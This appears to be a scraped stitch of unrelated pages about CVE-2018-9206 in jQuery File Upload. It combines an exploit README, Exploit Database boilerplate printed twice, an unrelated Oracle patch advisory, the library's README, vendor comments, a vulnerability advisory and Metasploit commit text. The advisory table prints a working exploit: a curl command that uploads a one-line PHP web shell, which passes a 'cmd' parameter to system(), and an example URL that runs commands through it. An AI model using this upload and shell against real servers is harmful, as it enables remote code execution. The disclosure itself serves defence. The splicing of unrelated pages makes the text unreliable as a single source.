## [README.md](#readme)

A quick POC for CVE-2018-9206.

This exploit will attempt to find one of the three common variations of the software and upload a simple PHP shell.

[![alt text](https://camo.githubusercontent.com/de816a70453a30fbcc2789bca95ad090b7a5c8469e67c875cc11a82b9ca96491/687474703a2f2f7777772e76617069646c6162732e636f6d2f6d2f4356452d323031382d393230362d6578702e706e67)](https://camo.githubusercontent.com/de816a70453a30fbcc2789bca95ad090b7a5c8469e67c875cc11a82b9ca96491/687474703a2f2f7777772e76617069646c6162732e636f6d2f6d2f4356452d323031382d393230362d6578702e706e67)

I've done some testing against the 1000 forks of the original code and it seems only 36 were not vulnerable. I found these only required a slight tweak to my exploit to get the majority of them working.

Results are in the file test\_results.txt.

Special Thanks to Phackt, @phackt\_ul. He refactored the exploit code and added the docker testing environment.

For testing purpose (will create an Apache/PHP docker container with vuln versions of the plugin):

`./docker/install.sh`

You can examine the docker container with:

`root # docker run -it vuln bash`

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Oracle Critical Patch Update Advisory - January 2019

## Oracle Critical Patch Update Advisory - January 2019

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

* [Critical Patch Updates, Security Alerts and Bulletins](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 284 new security fixes across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [January 2019 Critical Patch Update: Executive Summary and Analysis](//support.oracle.com/rs?type=doc&id=2489117.1).

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Users running Java SE with a browser can download the latest release from <http://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in  [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujan2019verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update fixes as soon as possible**. Until you apply the Critical Patch Update fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/support/lifetime-support/) for further guidelines regarding support policies and phases of support.

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security fixes are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the January 2019 Critical Patch Update to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2019 Patch Availability Document for Oracle Products, [My Oracle Support Note 2466391.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2466391.1).

#### Notes:

1. Outside In Technology is a suite of software development kits (SDKs). The protocol and CVSS score depend on the software that uses the Outside In Technology code. The CVSS score assumes that the software passes data received over a network directly to Outside In Technology code, but if data is not received over a network the CVSS score may be lower.

## Demo

[Demo File Upload](https://blueimp.github.io/jQuery-File-Upload/)

## Features

* **Multiple file upload:**

  Allows to select multiple files at once and upload them simultaneously.
* **Drag & Drop support:**

  Allows to upload files by dragging them from your desktop or file manager and
  dropping them on your browser window.
* **Upload progress bar:**

  Shows a progress bar indicating the upload progress for individual files and
  for all uploads combined.
* **Cancelable uploads:**

  Individual file uploads can be canceled to stop the upload progress.
* **Resumable uploads:**

  Aborted uploads can be resumed with browsers supporting the Blob API.
* **Chunked uploads:**

  Large files can be uploaded in smaller chunks with browsers supporting the
  Blob API.
* **Client-side image resizing:**

  Images can be automatically resized on client-side with browsers supporting
  the required JS APIs.
* **Preview images, audio and video:**

  A preview of image, audio and video files can be displayed before uploading
  with browsers supporting the required APIs.
* **No browser plugins (e.g. Adobe Flash) required:**

  The implementation is based on open standards like HTML5 and JavaScript and
  requires no additional browser plugins.
* **Graceful fallback for legacy browsers:**

  Uploads files via XMLHttpRequests if supported and uses iframes as fallback
  for legacy browsers.
* **HTML file upload form fallback:**

  Allows progressive enhancement by using a standard HTML file upload form as
  widget element.
* **Cross-site file uploads:**

  Supports uploading files to a different domain with cross-site XMLHttpRequests
  or iframe redirects.
* **Multiple plugin instances:**

  Allows to use multiple plugin instances on the same webpage.
* **Customizable and extensible:**

  Provides an API to set individual options and define callback methods for
  various upload events.
* **Multipart and file contents stream uploads:**

  Files can be uploaded as standard "multipart/form-data" or file contents
  stream (HTTP PUT file upload).
* **Compatible with any server-side application platform:**

  Works with any server-side platform (PHP, Python, Ruby on Rails, Java,
  Node.js, Go etc.) that supports standard HTML form file uploads.

## Security

⚠️ Please read the [VULNERABILITIES](/blueimp/jQuery-File-Upload/blob/master/VULNERABILITIES.md) document for a list of
fixed vulnerabilities

Please also read the [SECURITY](/blueimp/jQuery-File-Upload/blob/master/SECURITY.md) document for instructions on how to
securely configure your Web server for file uploads.

## Setup

jQuery File Upload can be installed via [NPM](https://www.npmjs.com/):

```
npm install blueimp-file-upload
```

This allows you to include [jquery.fileupload.js](/blueimp/jQuery-File-Upload/blob/master/js/jquery.fileupload.js) and
its extensions via `node_modules`, e.g:

```
<script src="node_modules/blueimp-file-upload/js/jquery.fileupload.js"></script>
```

The widget can then be initialized on a file upload form the following way:

```
$('#fileupload').fileupload();
```

For further information, please refer to the following guides:

* [Main documentation page](https://github.com/blueimp/jQuery-File-Upload/wiki)
* [List of all available Options](https://github.com/blueimp/jQuery-File-Upload/wiki/Options)
* [The plugin API](https://github.com/blueimp/jQuery-File-Upload/wiki/API)
* [How to setup the plugin on your website](https://github.com/blueimp/jQuery-File-Upload/wiki/Setup)
* [How to use only the basic plugin.](https://github.com/blueimp/jQuery-File-Upload/wiki/Basic-plugin)

## Requirements

### Mandatory requirements

* [jQuery](https://jquery.com/) v1.7+
* [jQuery UI widget factory](https://api.jqueryui.com/jQuery.widget/) v1.9+
  (included): Required for the basic File Upload plugin, but very lightweight
  without any other dependencies from the jQuery UI suite.
* [jQuery Iframe Transport plugin](https://github.com/blueimp/jQuery-File-Upload/blob/master/js/jquery.iframe-transport.js)
  (included): Required for
  [browsers without XHR file upload support](https://github.com/blueimp/jQuery-File-Upload/wiki/Browser-support).

### Optional requirements

* [JavaScript Templates engine](https://github.com/blueimp/JavaScript-Templates)
  v3+: Used to render the selected and uploaded files.
* [JavaScript Load Image library](https://github.com/blueimp/JavaScript-Load-Image)
  v2+: Required for the image previews and resizing functionality.
* [JavaScript Canvas to Blob polyfill](https://github.com/blueimp/JavaScript-Canvas-to-Blob)
  v3+:Required for the resizing functionality.
* [blueimp Gallery](https://github.com/blueimp/Gallery) v2+: Used to display the
  uploaded images in a lightbox.
* [Bootstrap](https://getbootstrap.com/) v3+: Used for the demo design.
* [Glyphicons](https://glyphicons.com/) Icon set used by Bootstrap.

### Cross-domain requirements

[Cross-domain File Uploads](https://github.com/blueimp/jQuery-File-Upload/wiki/Cross-domain-uploads)
using the
[Iframe Transport plugin](https://github.com/blueimp/jQuery-File-Upload/blob/master/js/jquery.iframe-transport.js)
require a redirect back to the origin server to retrieve the upload results. The
[example implementation](https://github.com/blueimp/jQuery-File-Upload/blob/master/js/main.js)
makes use of
[result.html](https://github.com/blueimp/jQuery-File-Upload/blob/master/cors/result.html)
as a static redirect page for the origin server.

The repository also includes the
[jQuery XDomainRequest Transport plugin](https://github.com/blueimp/jQuery-File-Upload/blob/master/js/cors/jquery.xdr-transport.js),
which enables limited cross-domain AJAX requests in Microsoft Internet Explorer
8 and 9 (IE 10 supports cross-domain XHR requests).

The XDomainRequest object allows GET and POST requests only and doesn't support
file uploads. It is used on the
[Demo](https://blueimp.github.io/jQuery-File-Upload/) to delete uploaded files
from the cross-domain demo file upload service.

## Browsers

### Desktop browsers

The File Upload plugin is regularly tested with the latest browser versions and
supports the following minimal versions:

* Google Chrome
* Apple Safari 4.0+
* Mozilla Firefox 3.0+
* Opera 11.0+
* Microsoft Internet Explorer 6.0+

### Mobile browsers

The File Upload plugin has been tested with and supports the following mobile
browsers:

* Apple Safari on iOS 6.0+
* Google Chrome on iOS 6.0+
* Google Chrome on Android 4.0+
* Default Browser on Android 2.3+
* Opera Mobile 12.0+

| Thanks for your report [@lcashdol](https://github.com/lcashdol)  Reading the CVE report I can not yet confirm a vulnerability in this project. If however you have a proof of concept how the default implementations provided by this project can be used for a remote code execution, please contact me via <https://blueimp.net>  For information about potential security vulnerabilities when misconfiguring file upload handling in relation to this project, please have a look art the following wiki page: <https://github.com/blueimp/jQuery-File-Upload/wiki/Security>  A common misconception is that allowing the upload of arbitrary files by itself results in a security vulnerability. Only in combination with a misconfiguration in how these files are handled can this result in a vulnerability. |

| Thanks to [@lcashdol](https://github.com/lcashdol)'s report, the issue could be identified as a combination of the default configuration of Apache v2.3.9+ to disable `.htaccess` support and the jQuery File Upload PHP implementation relying on its [.htaccess](https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/files/.htaccess) file for security.  As security fix, instead of disabling the example implementation completely, only image file types are now allowed by default.  Thanks again [@lcashdol](https://github.com/lcashdol)! |

| Advisory #: 204 |
| --- |
| **Title:** jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2018-10-09 |
| **CVE-ID:**[[CVE-2018-9206](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9206)] |
| **CWE:** CWE-434 arbitrary file upload |
| **Download Site:** <https://github.com/blueimp/jQuery-File-Upload/> |
| **Vendor:** https://github.com/blueimp |
| **Vendor Notified:**  2018-10-09 |
| **Vendor Contact:** blueimp.net, fixed v9.22.1 |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=204> |
| **Description:** File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads. |
| **Vulnerability:**The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution. The back end PHP code under server/php/ is used to handle requests from the javascript front end. This code will allow any file type to be uploaded including executable files with .php extensions. The javascript front end sends POST requests to index.php that in turn loads the UploadHandler class from UploadHandler.php. Files are then written to the server/php/files directory. |
| **Export:** [JSON](export_mitre_v4.py?id=204) [TEXT](txt.php?v=204) [XML](xml.php?s=204) |
| **Exploit Code:** ```   1. $ curl   -F "files=@shell.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php 3. Where shell.php is: 5. <?php $cmd=$_GET['cmd']; [system](http://www.php.net/system)($cmd);?> 7. Or 9. https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206  ``` |
| **Screen Shots:** [[CVE-2018-9206.png](/m/CVE-2018-9206.png)][[CVE-2018-9206-result.png](/m/CVE-2018-9206-result.png)] |
| **Notes:** ``` Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514  The author includes a .htaccess under server/php/files that attempt to force the file as a download and change the file extension to .html.  .htaccess with comments removed:  SetHandler default-handler ForceType application/octet-stream Header set Content-Disposition attachment  	ForceType none 	Header unset Content-Disposition   Header set X-Content-Type-Options nosniff  Testing this on default versions of Ubuntu and Debian:  If I enable AllowOverride All in /etc/apache2/apache2.conf for the directory /var/www I get an Internal Server Error.  The error log states:  Invalid command 'Header', perhaps misspelled or defined by a module not included in the server configuration.  So it seems the default apache configuration is missing mod_headers.  https://httpd.apache.org/docs/current/mod/mod_headers.html  root@debian:/etc/apache2/mods-enabled# ln -s ../mods-available/headers.load  root@debian:/etc/apache2/mods-enabled# /etc/init.d/apache2 restart [ ok ] Restarting apache2 (via systemctl): apache2.service.  http://example.com/jQuery-File-Upload-9.22.0/server/php/files/shell.php?cmd=uptime  Now the above downloads shell.html as the software author intended.    ``` |

Here's a potential bug. `res` could be nil and you are accessing the #code method.

we can use `work-the-flow-file-upload` here again. Maybe replace or add as an additional check, it's up to you.

As noted by @bcoles, we have a module exploiting this vuln in #5130,
though it was described as the WordPress plugin and not the asset it had
included. The vuln was \"patched\" in the plugin by deleting the code.
Somehow this flew under everyone's noses.

`[Add WordPress Work The Flow File Upload links](/wvu/metasploit-framework/commit/c9673df3b8fc8c1daca17300a7c985d531bf322a "Add WordPress Work The Flow File Upload links

As noted by @bcoles, we have a module exploiting this vuln in #5130,
though it was described as the WordPress plugin and not the asset it had
included. The vuln was \"patched\" in the plugin by deleting the code.
Somehow this flew under everyone's noses.

        This module exploits an arbitrary file upload in the sample PHP upload
        handler for blueimp's jQuery File Upload widget in versions <= 9.22.0.

        Due to a default configuration in Apache 2.3.9+, the widget's .htaccess
        file may be disabled, enabling exploitation of this vulnerability.

        This vulnerability has been exploited in the wild since at least 2015
        and was publicly disclosed to the vendor in 2018. It has been present
        since the .htaccess change in Apache 2.3.9.

        This module provides a generic exploit against the jQuery widget.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
